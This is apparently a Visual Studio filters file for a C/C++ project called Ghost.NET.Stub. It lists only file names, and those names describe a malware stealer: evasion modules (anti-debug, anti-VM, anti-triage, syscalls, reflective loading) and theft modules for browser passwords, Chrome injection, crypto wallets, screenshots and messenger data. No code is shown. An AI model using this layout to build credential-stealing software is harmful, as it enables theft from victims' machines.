<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="Ghost.NET.Stub.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="winapi_structs.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="Anti_Triage.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="NtGlobalFlag.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="IsDebuggerPresent.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="Interrupt_3.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="BeingDebugged.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="SharedUserData_KernelDebugger.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="UnhandledExceptionFilter_Handler.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="os.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="syscalls.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="chrome_inject.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="reflective_loader.c">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="AdvancedFileCopier.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="FileUtils.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="MonitorCapture.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="PCInfoGatherer.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="WalletData.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="telegram.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="signal.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="qtox.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="viber.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="anti-vm.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="obfusheader.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="winapi_structs.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="peb.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Anti_Triage.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="EntryPoint_AntiDebug.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="NtGlobalFlag.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="IsDebuggerPresent.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Interrupt_3.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="BeingDebugged.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Vectored_Exception_Handling.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Segment_Encryption.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Break_IDA_x64.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="SharedUserData_KernelDebugger.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="UnhandledExceptionFilter_Handler.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Gecko.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Passwords.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="os.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Crypto.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Paths.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Models.hpp">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Helper.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="core.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Deduplicator.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="syscalls.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="reflective_loader.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="chrome_inject.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="addme\libs\chacha\chacha20.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
  <ItemGroup>
    <ResourceCompile Include="Ghost.NET.Stub.rc">
      <Filter>Resource Files</Filter>
    </ResourceCompile>
  </ItemGroup>
  <ItemGroup>
    <MASM Include="syscall_trampoline_x64.asm">
      <Filter>Source Files</Filter>
    </MASM>
  </ItemGroup>
</Project>